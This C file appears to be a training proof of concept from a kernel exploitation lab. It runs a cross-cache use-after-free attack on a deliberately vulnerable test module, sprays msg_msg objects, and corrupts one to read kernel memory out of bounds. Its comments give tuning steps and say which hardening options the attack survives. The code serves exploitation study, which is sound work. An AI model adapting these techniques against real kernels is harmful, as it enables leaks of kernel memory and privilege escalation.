/*
 * Funny experiments with Linux kernel exploitation:
 * a basic use-after-free exploit writing data to the freed `drill_item_t` struct.
 *
 * Only basic methods. Just for fun.
 *
 * You may compile the Linux kernel with these options
 * (they don't break the implemented cross-cache attack):
 *   - CONFIG_SLAB_BUCKETS
 *   - CONFIG_RANDOM_KMALLOC_CACHES
 *
 * Ensure that CONFIG_CHECKPOINT_RESTORE=y to allow calling msgrcv() with the MSG_COPY flag.
 *
 * This PoC performs out-of-bounds reading of the kernel memory using a corrupted msg_msg.
 */

#define _GNU_SOURCE

#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <assert.h>
#include <sched.h>
#include <sys/msg.h>
#include "drill.h"

#define STR_EXPAND(arg) #arg
#define STR(arg) STR_EXPAND(arg)

int do_cpu_pinning(int cpu_n)
{
	int ret = 0;
	cpu_set_t single_cpu;

	CPU_ZERO(&single_cpu);
	CPU_SET(cpu_n, &single_cpu);

	ret = sched_setaffinity(0, sizeof(single_cpu), &single_cpu);
	if (ret != 0) {
		perror("[-] sched_setaffinity");
		return EXIT_FAILURE;
	}

	printf("[+] pinned to CPU #%d\n", cpu_n);
	return EXIT_SUCCESS;
}

int act(int act_fd, int code, int n, char *args)
{
	char buf[DRILL_ACT_SIZE] = { 0 };
	size_t len = 0;
	ssize_t bytes = 0;

	if (args)
		snprintf(buf, DRILL_ACT_SIZE, "%d %d %s", code, n, args);
	else
		snprintf(buf, DRILL_ACT_SIZE, "%d %d", code, n);

	len = strlen(buf) + 1; /* with null byte */
	assert(len <= DRILL_ACT_SIZE);

	bytes = write(act_fd, buf, len);
	if (bytes <= 0) {
		perror("[-] write");
		return EXIT_FAILURE;
	}
	if (bytes != len) {
		printf("[-] wrote only %zd bytes to drill_act\n", bytes);
		return EXIT_FAILURE;
	}

	return EXIT_SUCCESS;
}

/*
 * Collect the needed info for a cross-cache attack:
 *
 *  - Get the number of objects per slab containing a vulnerable object
 *    (let's call it initial slab). For example,
 *    /sys/kernel/slab/kmalloc-rnd-01-96/objs_per_slab is 42.
 *
 *  - Get the number of per-CPU partial slabs in the initial kmem_cache (see in gdb).
 *    For example, kmem_cache.cpu_partial_slabs for kmalloc-rnd-01-96 is 6.
 *
 *  - Get the minimum number of per-node partial slabs in the initial kmem_cache.
 *    For example, /sys/kernel/slab/kmalloc-rnd-01-96/min_partial is 5.
 *    Ensure that this number is smaller than cpu_partial_slabs, otherwise
 *    you will have to deal with empty slabs stuck in the per-node partial list.
 *
 *  - Estimate the number of holes in the initial slab cache.
 *    It can't be precise because these number change.
 *    Calculate (num_objs - active_objs) from /proc/slabinfo for the initial slab cache:
 *      cat /proc/slabinfo |grep "kmalloc-rnd-..-96" | awk '{print $1, $3 - $2}'
 *    Take the biggest number of holes and multiply it by 2, for example (just to be safe).
 *
 *  - Estimate the number of holes in the final slab cache containing the spray objects.
 *    Again, it can't be precise because these number change.
 *    Calculate (num_objs - active_objs) from /proc/slabinfo for the final slab cache:
 *      cat /proc/slabinfo |grep "msg_msg-96" | awk '{print $1, $3 - $2}'
 *    On a clean system, there are no objects in the msg_msg-96, so this PoC has
 *    no holes to plug in the final slab cache.
 */
#define OBJS_PER_SLAB 42
#define CPU_PARTIAL_SLABS 6
#define HOLES 450

/* Perform a cross-cache attack:
 *  - pin the process to a single CPU
 *  - plug the holes in the initial slab cache
 *  - plug the holes in the final slab cache (skipped in this PoC)
 *  - allocate (objs_per_slab * cpu_partial_slabs) objects for the partial list clean-up
 *  - create new active slab, allocate objs_per_slab objects
 *  - allocate a vulnerable object
 *  - create new active slab, allocate objs_per_slab objects
 *  - free (objs_per_slab * 2 - 1) objects before last object to free the slab with uaf object
 *  - free 1 out of each objs_per_slab objects in reserved slabs to clean up the partial list
 *  - allocate (objs_per_slab * 5) spray objects to reclaim uaf memory as a final slab
 *  - perform uaf write using the dangling reference to the vulnerable object
 *  - execute the exploit primitive via the overwritten spray object
 */

/* clang-format off */
#define MSG_NORM_SIZE	DRILL_ITEM_SIZE - 48
#define MSG_NORM_TYPE	5
#define MSG_OOB_SIZE	0x2000
#define BUF_OOB_SIZE	MSG_OOB_SIZE + 0x100
#define MSG_OOB_TYPE	0xc001
/* clang-format on */

unsigned long *msgrcv_buf = NULL;
int msqid = -1;

struct {
	long mtype;
	char mtext[MSG_NORM_SIZE];
} msg_oob_r;

int prepare_msg_msg(void)
{
	int for_ftok_fd = -1;
	key_t key;

	msgrcv_buf = malloc(BUF_OOB_SIZE);
	if (msgrcv_buf == NULL) {
		perror("[-] malloc");
		return EXIT_FAILURE;
	}
	memset(msgrcv_buf, 0, BUF_OOB_SIZE);

	for_ftok_fd = open("forftok1", O_CREAT, S_IRUSR | S_IWUSR);
	if (for_ftok_fd < 0) {
		perror("[-] open for ftok");
		return EXIT_FAILURE;
	}
	close(for_ftok_fd);

	key = ftok("forftok1", 1);
	if (key == -1) {
		perror("[-] ftok");
		return EXIT_FAILURE;
	}

	msqid = msgget(key, IPC_CREAT | 0666);
	if (msqid == -1) {
		perror("[-] msgget");
		return EXIT_FAILURE;
	}

	printf("[+] created msqid %d\n", msqid);

	memset(msg_oob_r.mtext, 0x42, MSG_NORM_SIZE);
	msg_oob_r.mtype = MSG_NORM_TYPE;

	return EXIT_SUCCESS;
}

int main(void)
{
	int result = EXIT_FAILURE;
	int ret = EXIT_FAILURE;
	int act_fd = -1;
	long i = 0;
	long current_n = 0;
	long reserved_from_n = 0;
	long uaf_n = 0;
	ssize_t bytes = 0;
	long uaf_msg_n = 0;

	printf("begin as: uid=%d, euid=%d\n", getuid(), geteuid());

	ret = prepare_msg_msg();
	if (ret == EXIT_FAILURE)
		goto end;

	act_fd = open("/proc/drill_act", O_WRONLY);
	if (act_fd < 0) {
		perror("[-] open drill_act");
		goto end;
	}
	printf("[+] drill_act is opened\n");

	if (do_cpu_pinning(0) == EXIT_FAILURE)
		goto end;

	printf("[!] plug the holes in the initial slab cache\n");
	for (i = 0; i < HOLES; i++) {
		if (act(act_fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
			printf("[-] DRILL_ACT_ALLOC\n");
			goto end;
		}
	}
	current_n += i;
	printf("[+] done, current_n: %ld (next for allocating)\n", current_n);
	reserved_from_n = current_n;

	printf("[!] allocate (objs_per_slab * cpu_partial_slabs) objects for the partial list clean-up\n");
	for (i = 0; i < OBJS_PER_SLAB * CPU_PARTIAL_SLABS; i++) {
		if (act(act_fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
			printf("[-] DRILL_ACT_ALLOC\n");
			goto end;
		}
	}
	current_n += i;
	printf("[+] done, current_n: %ld (next for allocating)\n", current_n);

	printf("[!] create new active slab, allocate objs_per_slab objects\n");
	for (i = 0; i < OBJS_PER_SLAB; i++) {
		if (act(act_fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
			printf("[-] DRILL_ACT_ALLOC\n");
			goto end;
		}
	}
	current_n += i;
	printf("[+] done, current_n: %ld (next for allocating)\n", current_n);

	printf("[!] allocate a vulnerable object\n");
	if (act(act_fd, DRILL_ACT_ALLOC, current_n, NULL) == EXIT_FAILURE) {
		printf("[-] DRILL_ACT_ALLOC\n");
		goto end;
	}
	uaf_n = current_n;
	current_n++;
	printf("[+] done, uaf_n: %ld, current_n: %ld (next for allocating)\n", uaf_n, current_n);

	printf("[!] create new active slab, allocate objs_per_slab objects\n");
	for (i = 0; i < OBJS_PER_SLAB; i++) {
		if (act(act_fd, DRILL_ACT_ALLOC, current_n + i, NULL) == EXIT_FAILURE) {
			printf("[-] DRILL_ACT_ALLOC\n");
			goto end;
		}
	}
	current_n += i;
	printf("[+] done, current_n: %ld (next for allocating)\n", current_n);

	printf("[!] free (objs_per_slab * 2 - 1) objects before last object to free the slab with uaf object\n");
	current_n--; /* point to the last allocated */
	current_n--; /* don't free the last allocated to keep this active slab */
	for (i = 0; i < OBJS_PER_SLAB * 2 - 1; i++) {
		if (act(act_fd, DRILL_ACT_FREE, current_n - i, NULL) == EXIT_FAILURE) {
			printf("[-] DRILL_ACT_FREE\n");
			goto end;
		}
	}
	current_n -= i;
	assert(current_n < uaf_n); /* to be sure that the uaf object has been freed here */
	printf("[+] done, current_n: %ld (next for freeing)\n", current_n);

	printf("[!] free 1 out of each objs_per_slab objects in reserved slabs to clean up the partial list\n");
	for (i = 0; i < OBJS_PER_SLAB * CPU_PARTIAL_SLABS; i += OBJS_PER_SLAB) {
		if (act(act_fd, DRILL_ACT_FREE, reserved_from_n + i, NULL) == EXIT_FAILURE) {
			printf("[-] DRILL_ACT_FREE\n");
			goto end;
		}
	}
	/* Now current_n should point to the first element after the reserved slabs */
	assert(reserved_from_n + i == current_n);
	printf("[+] done, now go spraying\n");

	printf("[!] allocate (objs_per_slab * 5) spray objects to reclaim uaf memory as a final slab\n");
	for (i = 0; i < OBJS_PER_SLAB * 5; i++) {
		ret = msgsnd(msqid, &msg_oob_r, sizeof(msg_oob_r.mtext), 0);
		if (ret) {
			perror("[-] realloc msgsnd");
			goto end;
		}
	}
	printf("[+] msg_msg spraying is done\n");

	printf("[!] perform uaf write using the dangling reference to the vulnerable object\n");
	/*
	 * Overwrite msg_msg m_type:
	 *  - m_type in msg_msg is at the offset 16;
	 *  - DRILL_ACT_SAVE_VAL with 0 as 2nd argument also starts at the offset 16.
	 */
	ret = act(act_fd, DRILL_ACT_SAVE_VAL, uaf_n, STR(MSG_OOB_TYPE) " 0");
	if (ret == EXIT_FAILURE)
		goto end;
	printf("[+] DRILL_ACT_SAVE_VAL\n");

	/*
	 * Overwrite msg_msg size m_ts:
	 *  - m_ts in msg_msg is at the offset 24;
	 *  - DRILL_ACT_SAVE_VAL with 8 as 2nd argument also starts at the offset 24.
	 */
	ret = act(act_fd, DRILL_ACT_SAVE_VAL, uaf_n, STR(MSG_OOB_SIZE) " 8");
	if (ret == EXIT_FAILURE)
		goto end;
	printf("[+] DRILL_ACT_SAVE_VAL\n");

	printf("[!] execute the exploit primitive via the overwritten spray object\n");
	for (i = 0; i < OBJS_PER_SLAB * 5; i++) {
		bytes = msgrcv(msqid, msgrcv_buf, MSG_OOB_SIZE, i, IPC_NOWAIT | MSG_COPY);
		if (bytes == -1) {
			perror("[-] msgrcv MSG_COPY");
			goto end;
		}

		if (bytes == sizeof(msg_oob_r.mtext)) {
			printf("    normal message: %zd bytes, type 0x%lx\n", bytes, msgrcv_buf[0]);
		} else {
			printf("[+] OOB READ: %zd bytes, type 0x%lx\n", bytes, msgrcv_buf[0]);
			uaf_msg_n = i;
			break;
		}
	}

	if (bytes == sizeof(msg_oob_r.mtext)) {
		printf("[-] cross-cache attack failed, good luck with debugging\n");
		goto end;
	}

	printf("[+] non-zero values from oob read dump (message %ld):\n", uaf_msg_n);
	for (i = 0; i < bytes / sizeof(unsigned long); i++) {
		if (msgrcv_buf[i])
			printf("  %ld: 0x%lx\n", i * sizeof(unsigned long), msgrcv_buf[i]);
	}

	result = EXIT_SUCCESS;

end:
	for (i = 0;; i++) {
		bytes = msgrcv(msqid, msgrcv_buf, MSG_OOB_SIZE, MSG_NORM_TYPE, IPC_NOWAIT);
		if (bytes == -1)
			break;
	}

	if (act_fd >= 0) {
		ret = close(act_fd);
		if (ret != 0)
			perror("[-] close act_fd");
	}

	if (remove("./forftok1") != 0)
		perror("[-] remove ./forftok1");

	return result;
}
